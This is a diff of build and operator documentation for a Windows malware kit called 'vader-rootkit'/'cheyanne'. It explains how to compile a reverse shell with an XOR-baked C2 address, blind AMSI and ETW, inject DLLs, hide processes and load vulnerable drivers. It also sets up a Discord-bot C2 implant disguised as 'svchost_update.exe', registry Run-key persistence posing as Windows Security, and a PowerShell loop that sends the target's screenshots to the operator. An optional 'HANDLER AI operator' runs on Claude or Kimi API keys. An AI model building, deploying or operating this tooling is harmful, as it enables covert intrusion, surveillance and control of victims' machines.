@@ -51,17 +51,15 @@ Install **"Desktop development with C++"**. This gives you:
 
 ### Critical Path — vcvars64.bat
 
-Every compile command runs through this batch file first. The project hardcodes:
+Every compile command runs through this batch file first. `cheyanne_config.py` **auto-detects** your Visual Studio installation by globbing:
 
 ```
-C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat
+C:\Program Files\Microsoft Visual Studio\*\*\VC\Auxiliary\Build\vcvars64.bat
 ```
 
-If your VS version differs (e.g. `\17\` for VS 2022 or `\18\` for VS 2025), update the `VCVARS` variable in:
-- `deploy.py` (line ~49)
-- `mutate.py` (line ~37)
-- `cloak/build_cloak.py` (line ~22)
-- `byovd/build_byovd.py` (line ~22)
+All build scripts (`deploy.py`, `mutate.py`, `cloak/build_cloak.py`, `byovd/build_byovd.py`, `vader_ui.py`) import from `cheyanne_config.py` with a hardcoded fallback. You should NOT need to edit any paths manually.
+
+If auto-detection fails (no Visual Studio found), install "Desktop development with C++" workload from the Visual Studio Installer.
 
 ### Verify Toolchain
 
@@ -93,10 +91,10 @@ Everything uses stdlib only. No pip install required. The following stdlib modul
 
 ## 2. Directory Structure
 
-Create this tree under your chosen root (original: `C:\Users\gwu07\Desktop\vader-rootkit\`):
+Create this tree under your chosen root (original: `C:\Users\gwu07\Desktop\cheyanne\`):
 
 ```
-vader-rootkit/
+cheyanne/
 ├── deploy.py              # Deployment orchestrator
 ├── mutate.py              # XOR key rotation pipeline
 ├── metamorph.py           # Source-level metamorphic engine
@@ -287,7 +285,7 @@ TIER 5 — META TOOLS (Python, no compile — just verify they run)
 ### One-Command Full Build
 
 ```cmd
-cd C:\Users\gwu07\Desktop\vader-rootkit
+cd C:\Users\gwu07\Desktop\cheyanne
 python deploy.py --compile
 ```
 
@@ -314,14 +312,14 @@ This compiles all Tier 2 components. Cloak and BYOVD have separate build scripts
 
 **Bake in C2 address:**
 ```cmd
-python shell\vader_listener.py 4444 --gen
+python shell\vader_listener.py 4443 --gen
 ```
 This outputs XOR-encoded IP/port byte arrays to paste into the shell source.
 
 **Test:** Start listener, compile shell, run shell. Should get cmd prompt.
 ```cmd
 :: Terminal 1:
-python shell\vader_listener.py 4444
+python shell\vader_listener.py 4443
 
 :: Terminal 2:
 shell\vader_shell.exe
@@ -518,7 +516,7 @@ python deploy.py --status               # Scan all binaries vs Defender
 python deploy.py --recon                # Run vader_recon.ps1
 python deploy.py --deploy V7            # Deploy single vector
 python deploy.py --chain V7             # Full: dark room + vector + shell
-python deploy.py --listen               # Start C2 listener (:4444)
+python deploy.py --listen               # Start C2 listener (:4443)
 python deploy.py --canary V7            # Check canary for vector
 python deploy.py --compile-shell IP PORT # Build shell with baked-in C2
 python deploy.py --pentest              # FULL AUTOMATION
@@ -839,7 +837,7 @@ python byovd\build_byovd.py --scan
 | Port | Protocol | Component | Script |
 |------|----------|-----------|--------|
 | 4443 | TCP raw | C2 listener (v2) | `shell/vader_c2_v2.py` |
-| 4444 | TCP raw | Reverse shell (v1, legacy) | `shell/vader_listener.py`, `shell/vader_c2.py` |
+| 4443 | TCP raw | Reverse shell (v1, legacy) | `shell/vader_listener.py`, `shell/vader_c2.py` |
 | 8080 | HTTP | Payload stager | `stagers/vader_serve.py` |
 | 8666 | HTTP | Web dashboard | `vader_ui.py` |
 | 8667 | TCP JSON | Agent listener | `vader_ui.py` (built-in) |
@@ -848,16 +846,51 @@ python byovd\build_byovd.py --scan
 | 8892 | HTTP | Watch live viewer | `vader_c2_v2.py` (browser) |
 | 53683 | TCP | Dropper callback | `cloak/c2_listen.py` |
 
+### Environment Setup (.env)
+
+Create `.env` in the project root. This is gitignored — never committed.
+
+```
+DISCORD_BOT_TOKEN=your_bot_token_here
+DISCORD_C2_CHANNEL=your_channel_id_here
+DISCORD_C2_WEBHOOK=https://discord.com/api/webhooks/...
+```
+
+**How to get these:**
+1. Create a Discord server (or use an existing one)
+2. Create a bot at https://discord.com/developers/applications → Bot → Copy token
+3. Invite bot to your server with `bot` + `applications.commands` scope and `Send Messages` + `Read Message History` permissions
+4. Create a `#c2` channel → right-click → Copy Channel ID (enable Developer Mode in Discord settings first)
+5. Channel Settings → Integrations → Webhooks → New Webhook → Copy URL
+
+**Optional (for HANDLER AI operator):**
+```
+OPENROUTER_API_KEY=sk-or-...      # For Kimi K2.5 backend
+ANTHROPIC_API_KEY=sk-ant-...       # For Claude backend
+```
+
+OpenRouter key from https://openrouter.ai/keys. Anthropic key from https://console.anthropic.com.
+
+See `agent/.env.example` for a full template.
+
+### Firewall Setup
+
+Run once on operator machine (requires admin):
+```cmd
+setup_firewall.bat
+```
+Opens all 6 ports permanently (survives reboots). Right-click → Run as administrator.
+
 ### Shell C2 (vader_shell + vader_listener)
 
 **Operator side:**
 ```cmd
-python shell\vader_listener.py 4444
+python shell\vader_listener.py 4443
 ```
 
 **Generate XOR config for target IP/port:**
 ```cmd
-python shell\vader_listener.py 4444 --gen
+python shell\vader_listener.py 4443 --gen
 ```
 Outputs XOR-encoded byte arrays for the IP and port. Paste into `vader_shell_annotated.c`, recompile.
 
@@ -924,7 +957,7 @@ python cloak\c2_listen.py
 
 ```
 [ ] dark_room\dark_room.exe --test                    → "AMSI: BLIND" + "ETW: BLIND"
-[ ] vader_listener.py 4444 + vader_shell.exe          → shell connects, cmd works
+[ ] vader_listener.py 4443 + vader_shell.exe          → shell connects, cmd works
 [ ] vader_inject.exe + vader_inject.dll               → DLL injected into target PID
 [ ] V7 phantom DLL planted + Office task triggered    → canary at C:\Windows\Temp\osp_telemetry.log
 [ ] cloak_loader.exe                                  → processes hidden from Task Manager
@@ -1074,11 +1107,11 @@ Common link libraries:
 
 ### "vcvars64.bat not found"
 
-Your Visual Studio path differs. Find the real path:
+`cheyanne_config.py` auto-detects Visual Studio. If it still fails, your VS install is non-standard. Find the real path:
 ```cmd
 dir "C:\Program Files\Microsoft Visual Studio\*\*\VC\Auxiliary\Build\vcvars64.bat" /s
 ```
-Update the `VCVARS` variable in all Python scripts listed in Section 1.
+Then edit the fallback in `cheyanne_config.py` line 22.
 
 ### "MpCmdRun.exe not found"
 
@@ -1318,17 +1351,17 @@ chey> persist              Dual registry Run keys — WindowsSecurityHealth + Wi
 
 | Payload | Binary | C2 Channel |
 |---------|--------|------------|
-| Discord implant | `svchost_health.exe` (PyInstaller) | Discord webhook + bot token |
+| Discord implant | `svchost_update.exe` (PyInstaller) | Discord webhook + bot token |
 | TCP reverse shell | `vader_shell.exe` (compiled C) | TCP :4443 |
 
-C2 IP is determined via `get_lan_ip()` — first non-127 interface address. **XOR-baked** into both payloads at compile time (key `0x5E` for C shell, direct source injection for Python implant). Operator types `deploy` with zero args. HTTP server on `:8890` serves both payloads. PowerShell download cradle sent to target to fetch and execute.
+C2 IP is auto-detected via UDP trick (`connect("8.8.8.8", 80)` → `getsockname()`). **XOR-baked** into the C shell at compile time (key rotated by `mutate.py` each build — check `XOR_KEY` in `vader_shell_annotated.c`). Operator types `deploy` with zero args. HTTP server on `:8890` serves both payloads. PowerShell download cradle sent to target to fetch and execute.
 
 ### Live Watch — How It Works
 
 Three components in concert:
 
 **1. Target-side (single PowerShell while-loop):**
-One command sends a `while($true)` loop to the target. Each iteration: capture screen via `System.Drawing` / `CopyFromScreen`, encode to `MemoryStream` (not disk — prevents stale frame issues), HTTP POST raw bytes to `http://<C2_IP>:8891/watch`, sleep N seconds, repeat. Runs until process is killed.
+One command sends a `while($true)` loop to the target. Each iteration: capture screen via `System.Drawing` / `CopyFromScreen`, save to `C:\Users\Public\screen.png` (delete old file first to prevent stale handles), read back with `[System.IO.File]::ReadAllBytes()`, HTTP POST raw bytes to `http://<C2_IP>:8891/screen.png`, sleep N seconds, repeat. Runs until process is killed.
 
 **2. Receiver (port 8891):**
 `start_watch_receiver()` — HTTP server accepting POSTs. Deletes old frame file before writing new one (cache-bust). Saves to `screenshots/watch_latest.jpg`.
@@ -1364,10 +1397,12 @@ Viewer is served over HTTP (not `file://`) because `file://` broke auto-refresh 
 
 | Registry Value Name | Payload Path | Mimics |
 |---------------------|-------------|--------|
-| `WindowsSecurityHealth` | `%USERPROFILE%\.local\bin\svchost_health.exe` | Windows Security |
-| `WindowsSecurityUpdate` | `%USERPROFILE%\.local\bin\vader_shell.exe` | Windows Update |
+| `WindowsSecurityHealth` | `C:\Users\Public\svchost_update.exe` | Windows Security |
+| `WindowsSecurityUpdate` | `C:\Users\Public\vader_shell.exe` | Windows Update |
 
-Both payloads copied to `%USERPROFILE%\.local\bin\` first (created if needed). Single PowerShell one-liner runs `reg add` for both keys. No arguments needed — paths are deterministic.
+Both payloads deployed to `C:\Users\Public\` by the `deploy` command. `persist` sets both registry Run keys. No arguments needed for vader_shell.exe — C2 IP is XOR-baked at compile time.
+
+**WARNING:** Run `deploy` before `persist`. The persist command assumes vader_shell.exe has the C2 IP baked in via Fresh Build. If the binary on target is an old generic build, it won't auto-connect on reboot.
 
 ### Non-Interactive Mode — `--tcp-cmd`
 
